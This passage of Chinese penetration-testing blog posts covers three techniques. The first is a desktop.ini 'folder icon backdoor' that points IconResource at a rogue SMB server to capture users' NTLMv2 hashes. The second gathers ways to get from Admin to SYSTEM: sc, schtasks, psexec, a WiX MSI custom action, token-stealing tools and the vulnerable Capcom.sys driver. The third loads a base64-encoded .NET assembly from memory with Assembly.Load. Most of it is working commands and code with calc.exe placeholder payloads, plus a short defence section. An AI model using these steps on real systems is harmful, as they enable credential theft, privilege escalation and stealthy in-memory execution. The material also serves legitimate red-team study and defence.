<h4 id="1正常文件服务器共享目录的test文件夹下添加文件desktopini内容如下">1、正常文件服务器共享目录的test文件夹下添加文件desktop.ini，内容如下：</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[.ShellClassInfo]
IconResource=\\192.168.62.130\test\SHELL32.dll,4
[ViewState]
Mode=
Vid=
FolderType=Generic

</code></pre></div></div>

<p><strong>注：</strong></p>

<p>IconResource指向伪造文件服务器，SHELL32.dll不存在</p>

<h4 id="2在伪造文件服务器上使用wireshark进行抓包-1">2、在伪造文件服务器上使用wireshark进行抓包</h4>

<h4 id="3客户端访问正常文件服务器-1">3、客户端访问正常文件服务器</h4>

<h4 id="4伪造文件服务器获得客户端本机当前用户的ntlmv2-hash-1">4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash</h4>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-23/3-1.png" alt="Alt text"></p>

<p>通过这种方式，相比于scf文件，隐蔽性更高</p>

<h2 id="0x05-文件夹图标后门">0x05 文件夹图标后门</h2>
<hr>

<p>原理同上，更改系统文件夹的配置文件desktop.ini，当用户打开指定文件夹时，将本机当前用户的NTLMv2 Hash发送至伪造文件服务器</p>

<p>默认情况下，系统常见文件夹下包含配置文件desktop.ini，例如文件夹<code class="language-plaintext highlighter-rouge">Program Files</code>，desktop.ini内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21781
</code></pre></div></div>

<p>尝试对其修改，添加如下内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IconResource=\\192.168.62.130\test\SHELL32.dll,4
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>需要管理员权限</p>

<p>测试成功</p>

<h3 id="实际测试-2">实际测试：</h3>

<p>客户端IP: 192.168.62.139</p>

<p>伪造文件服务器IP： 192.168.62.130</p>

<h4 id="1修改客户端文件路径为cprogram-filesdesktopini添加内容">1、修改客户端文件，路径为C:\Program Files\desktop.ini，添加内容</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IconResource=\\192.168.62.130\test\SHELL32.dll,4
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>IconResource指向伪造文件服务器，SHELL32.dll不存在</p>

<h4 id="2在伪造文件服务器上使用wireshark进行抓包-2">2、在伪造文件服务器上使用wireshark进行抓包</h4>

<h4 id="3客户端访问文件夹c">3、客户端访问文件夹c:\</h4>

<h4 id="4伪造文件服务器获得客户端本机当前用户的ntlmv2-hash-2">4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash</h4>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-23/3-2.png" alt="Alt text"></p>

<p>通过这种方式，相比于scf文件，无需添加文件，但需要管理员权限</p>

<h2 id="0x06-防御思路">0x06 防御思路</h2>
<hr>

<p>结合攻击方法，总结防御思路如下：</p>

<p>检查特殊文件.scf和desktop.ini，避免被添加UNC路径</p>

<p>如无特殊需要，建议配置防火墙规则禁止139和445端口</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文换了一种方式，解决了在获得内网一个文件服务器的权限后，获得更多用户的口令的问题。</p>

<p>通过修改文件服务器上的图标文件，强制用户访问伪造的文件服务器，在伪造的文件服务器上抓包获取连接文件服务器的NTLMv2 Hash。</p>

<p>结合攻击方法，总结防御思路。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January 23, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——从Admin权限切换到System权限</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，某些情况下需要用到system权限，例如操作注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM</code></p>

<p>恰巧最近看到了一篇文章介绍了几种获得system权限的方法，于是决定结合自己的经验对这方面的技巧做系统整理</p>

<p>当然，前提是已经获得系统的管理员权限</p>

<p>学习链接：</p>

<p>https://blog.xpnsec.com/becoming-system/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>通过创建服务获得System权限的方法</li>
  <li>利用MSIExec获得System权限的方法</li>
  <li>利用token复制获得System权限的方法</li>
  <li>利用Capcom.sys获得System权限的方法</li>
</ul>

<h2 id="0x02-通过创建服务获得system权限">0x02 通过创建服务获得System权限</h2>
<hr>

<h3 id="1通过sc命令实现">1、通过sc命令实现</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc Create TestService1 binPath= "cmd /c start" type= own type= interact
sc start TestService1
</code></pre></div></div>

<p>该方法在XP系统可以使用</p>

<p>Win7下使用时控制台提示：</p>

<blockquote>
  <p>警告: 服务 TestService1 被配置为交互式服务，其支持正受到抨击。该服务可能无法正常起作用。</p>
</blockquote>

<p>服务启动时弹框，需要点击查看消息才能执行代码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-22/2-1.png" alt="Alt text"></p>

<p>Win8下控制台提示错误，无法使用该方法</p>

<h3 id="2通过计划任务">2、通过计划任务</h3>

<p>使用at命令：</p>

<p><code class="language-plaintext highlighter-rouge">at 7:50 notepad.exe</code></p>

<p>默认以system权限启动，适用于Win7</p>

<p>从Win8开始不再支持at命令</p>

<p>使用schtasks命令：</p>

<p>创建服务，以system权限启动：</p>

<p><code class="language-plaintext highlighter-rouge">schtasks /Create /TN TestService2 /SC DAILY /ST 00:36 /TR notepad.exe /RU SYSTEM</code></p>

<p>查看服务状态：</p>

<p><code class="language-plaintext highlighter-rouge">schtasks /Query /TN TestService2</code></p>

<p>删除服务：</p>

<p><code class="language-plaintext highlighter-rouge">schtasks /Delete /TN TestService2 /F</code></p>

<p><strong>注：</strong></p>

<p>使用schtasks创建服务后记得手动删除</p>

<p>schtasks命令支持Win7-Win10</p>

<h3 id="3利用psexec">3、利用psexec</h3>

<p>使用psexec会创建PSEXESVC服务，产生日志Event 4697、Event 7045、Event 4624和Event 4652</p>

<p>以system权限启动：</p>

<p><code class="language-plaintext highlighter-rouge">psexec.exe -accepteula -s -d notepad.exe</code></p>

<p>默认情况下，system权限的进程不会在用户桌面显示，如果需要显示进程界面，可以加<code class="language-plaintext highlighter-rouge">/i</code>参数，命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">psexec.exe -accepteula -s -i -d notepad.exe</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-22/2-2.png" alt="Alt text"></p>

<h3 id="4meterpreter">4、Meterpreter</h3>

<p>参考Meterpreter的方法：</p>

<ul>
  <li>创建system权限的服务，提供一个命名管道</li>
  <li>创建进程，连接到该命名管道</li>
</ul>

<p>可供参考的代码：</p>

<p>https://github.com/xpn/getsystem-offline</p>

<p>需要getsystem-offline.exe和getsystem_service.exe</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-22/2-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>vs2012直接编译存在bug，可将函数<code class="language-plaintext highlighter-rouge">snprintf</code>替换为<code class="language-plaintext highlighter-rouge">_snprintf</code></p>

<h2 id="0x03-利用msiexec获得system权限">0x03 利用MSIExec获得System权限</h2>
<hr>

<p>我曾在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84msiexec/">《渗透测试中的msiexec》</a>介绍过利用Advanced Installer制作msi文件的方法，这里不再赘述</p>

<p>本节对XPN提到的方法做复现，使用wix3制作msi文件</p>

<p>wix3下载地址：</p>

<p>https://github.com/wixtoolset/wix3</p>

<p>msigen.wix的代码可参考如下地址：</p>

<p>https://gist.github.com/xpn/d1ef20dfd266053227d3e992ae84c64e</p>

<p>编译命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>candle.exe msigen.wix
torch.exe msigen.wixobj
</code></pre></div></div>

<p>我对XPN的代码做了修改，将payload替换为执行calc.exe，细节上做了部分修改，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
&lt;Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"&gt;
  &lt;Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product 
Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033"&gt;
    &lt;Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/&gt;
    &lt;Media Id="1" /&gt;

    &lt;Directory Id="TARGETDIR" Name="SourceDir"&gt;
      &lt;Directory Id="ProgramFilesFolder"&gt;
        &lt;Directory Id="INSTALLLOCATION" Name="Example"&gt;
          &lt;Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222"&gt;     
          &lt;/Component&gt;
        &lt;/Directory&gt;
      &lt;/Directory&gt;
    &lt;/Directory&gt;

    &lt;Feature Id="DefaultFeature" Level="1"&gt;
      &lt;ComponentRef Id="ApplicationFiles"/&gt;
    &lt;/Feature&gt;

    &lt;Property Id="cmdline"&gt;calc.exe
    &lt;/Property&gt;

    &lt;CustomAction Id="SystemShell" Execute="deferred" Directory="TARGETDIR" 
ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/&gt;

    &lt;CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check"&gt;
      invalid vbs to fail install
    &lt;/CustomAction&gt;

    &lt;InstallExecuteSequence&gt;
      &lt;Custom Action="SystemShell" After="InstallInitialize"&gt;&lt;/Custom&gt;
      &lt;Custom Action="FailInstall" Before="InstallFiles"&gt;&lt;/Custom&gt;
    &lt;/InstallExecuteSequence&gt;

  &lt;/Product&gt;
&lt;/Wix&gt;

</code></pre></div></div>

<p>经过我的测试，使用torch.exe将msigen.wixobj编译成msigen.msi文件会报错，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-22/2-4.png" alt="Alt text"></p>

<p>使用light.exe能够成功生成msigen.msi，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-22/2-5.png" alt="Alt text"></p>

<p>虽然报错，但不影响文件的生成和功能的执行</p>

<p>也就是说，完整编译命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>candle.exe msigen.wix
light.exe msigen.wixobj
</code></pre></div></div>

<p>直接双击执行msigen.msi会弹框，启动的calc.exe为system权限</p>

<p>命令行下执行：</p>

<p><code class="language-plaintext highlighter-rouge">msiexec /q /i msigen.msi</code></p>

<p>启动的calc.exe为high权限</p>

<h2 id="0x04-利用token复制获得system权限">0x04 利用token复制获得System权限</h2>
<hr>

<p>可参考之前的文章：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/">《渗透技巧——Token窃取与利用》</a></p>

<p>通过复制system权限的token，使进程获得system权限，常用工具如下：</p>

<h3 id="1incognito">1、incognito</h3>

<p><code class="language-plaintext highlighter-rouge">incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe</code></p>

<p>下载地址：</p>

<p>https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</p>

<h3 id="2invoke-tokenmanipulationps1">2、Invoke-TokenManipulation.ps1</h3>

<p><code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"</code></p>

<p>下载地址：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</p>

<h3 id="3selectmyparent">3、SelectMyParent</h3>

<p><code class="language-plaintext highlighter-rouge">SelectMyParent.exe cmd.exe 504</code></p>

<p>参考地址：</p>

<p>https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/SelectMyParent.cpp</p>

<p>Author： Didier Stevens</p>

<p><strong>注：</strong></p>

<p>SelectMyParent的原理同xpn开源的代码(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS method)相同，地址如下：</p>

<p>https://gist.github.com/xpn/a057a26ec81e736518ee50848b9c2cd6</p>

<h2 id="0x05-利用capcomsys获得system权限的方法">0x05 利用Capcom.sys获得System权限的方法</h2>
<hr>

<p>Capcom.sys是游戏公司Capcom的《街头霸王5》中用来反作弊的驱动程序，带有Capcom公司的签名，存在漏洞可以执行内核代码</p>

<p>下载地址：</p>

<p>https://github.com/3gstudent/test/blob/master/Capcom.sys</p>

<p>SHA1: <code class="language-plaintext highlighter-rouge">c1d5cf8c43e7679b782630e93f5e6420ca1749a7</code></p>

<p>适用于Win7x64</p>

<p>1、在当前系统创建服务</p>

<p>需要管理员权限</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc create Capcom type= kernel binPath= C:\test\Capcom.sys
sc start Capcom
</code></pre></div></div>
<p>2、执行漏洞利用程序</p>

<p>普通用户权限即可</p>

<p>可供参考的的代码：</p>

<p>https://github.com/tandasat/ExploitCapcom</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对常用的System权限获取方法做了整理，最后感谢xpn的博客和他的开源代码。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 22, 2017
  </div>

  
</article><article class="post">
  <h1>从内存加载.NET程序集(Assembly.Load)的利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(execute-assembly)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">《从内存加载.NET程序集(execute-assembly)的利用分析》</a>介绍了<code class="language-plaintext highlighter-rouge">"execute-assembly"</code>的实现方法和利用思路，能够从内存中加载.NET程序集。这个功能不需要向硬盘写入文件，十分隐蔽。</p>

<p>与此相似的方法还有一个是<code class="language-plaintext highlighter-rouge">Assembly.Load</code>，同样能够从内存中加载.NET程序集。</p>

<p>本文将会结合三个开源工程，介绍<code class="language-plaintext highlighter-rouge">Assembly.Load</code>的实现方法，分析利用思路。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容:</p>

<ul>
  <li>基础知识</li>
  <li>SharpCradle的利用分析</li>
  <li>SharpShell的利用分析</li>
  <li>SharpCompile的利用分析</li>
</ul>

<h2 id="0x02-基础知识">0x02 基础知识</h2>
<hr>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=netframework-4.5</p>

<h3 id="1assemblyloadassemblyloadfrom和assemblyloadfile的区别">1.Assembly.Load()、Assembly.LoadFrom()和Assembly.LoadFile()的区别</h3>

<p>Assembly.Load()是从String或AssemblyName类型加载程序集，可以读取字符串形式的程序集，也就是说，文件不需要写入硬盘</p>

<p>Assembly.LoadFrom()从指定文件中加载程序集，同时会加载目标程序集所引用和依赖的其他程序集</p>

<p>例如：</p>

<p><code class="language-plaintext highlighter-rouge">Assembly.LoadFrom("a.dll")</code>，如果a.dll中引用了b.dll，那么会同时加载a.dll和b.dll</p>

<p>Assembly.LoadFile()也是从指定文件中加载程序集，但不会加载目标程序集所引用和依赖的其他程序集</p>

<p>例如：</p>

<p><code class="language-plaintext highlighter-rouge">Assembly.LoadFile("a.dll")</code>，如果a.dll中引用了b.dll，那么不会加载b.dll</p>

<h3 id="2assemblyload的实现示例">2.Assembly.Load()的实现示例</h3>

<h4 id="1编写测试程序">(1)编写测试程序</h4>

<p>测试程序的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
namespace TestApplication
{
	public class Program
	{
    		public static void Main()
    		{
        		Console.WriteLine("Main");
    		}
	}
	public class aaa
	{
    		public static void bbb()
    		{
        		System.Diagnostics.Process p = new System.Diagnostics.Process();
        		p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
        		p.Start();
    		}
	}
}
</code></pre></div></div>

<p>使用csc.exe进行编译：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:testcalc.exe test.cs
</code></pre></div></div>

<p>生成testcalc.exe</p>

<h4 id="2读取testcalcexe的内容并作base64加密">(2)读取testcalc.exe的内容，并作base64加密</h4>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Reflection;
namespace TestApplication
{
    public class Program
    {
        public static void Main()
        {

            byte[] buffer = System.IO.File.ReadAllBytes("testcalc.exe");
            string base64str = Convert.ToBase64String(buffer);
            Console.WriteLine(base64str);
        }
    }
}
</code></pre></div></div>

<h4 id="3解密字符串变量还原testcalcexe的内容使用assemblyload加载程序集并调用方法bbb">(3)解密字符串变量，还原testcalc.exe的内容，使用Assembly.Load()加载程序集并调用方法bbb</h4>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Reflection;
namespace TestApplication
{
    public class Program
    {
        public static void Main()
        {

            string base64str = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
            byte[] buffer = Convert.FromBase64String(base64str);

            Assembly assembly = Assembly.Load(buffer);          
            Type type = assembly.GetType("TestApplication.aaa");
            MethodInfo method = type.GetMethod("bbb");
            Object obj = assembly.CreateInstance(method.Name);            
            method.Invoke(obj, null);
        }
    }
}
</code></pre></div></div>

<h2 id="0x03-sharpcradle的利用分析">0x03 SharpCradle的利用分析</h2>
<hr>

<p>https://github.com/anthemtotheego/SharpCradle</p>

<p>SharpCradle支持从Web或文件共享下载二进制文件并在内存中加载</p>

<p><strong>注：</strong></p>

<p>这里需要在远程服务器上保存编译后的二进制文件</p>

<p>SharpCradle的代码很清晰直观，这里提取出调用Assembly.Load()的相关代码，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        public static void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {       
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);                    
                    method.Invoke(o, null);
                }
            }//End try/catch            
        }//End loadAssembly
</code></pre></div></div>

<p>值得注意的是<code class="language-plaintext highlighter-rouge">MethodInfo method = a.EntryPoint;</code>，表示调用的为入口函数</p>

<p>也就是说，被加载的程序集的主要功能要写在Main函数中，例如0x02中的示例代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
namespace TestApplication
{
	public class Program
	{
    		public static void Main()
    		{
        		Console.WriteLine("Main");
    		}
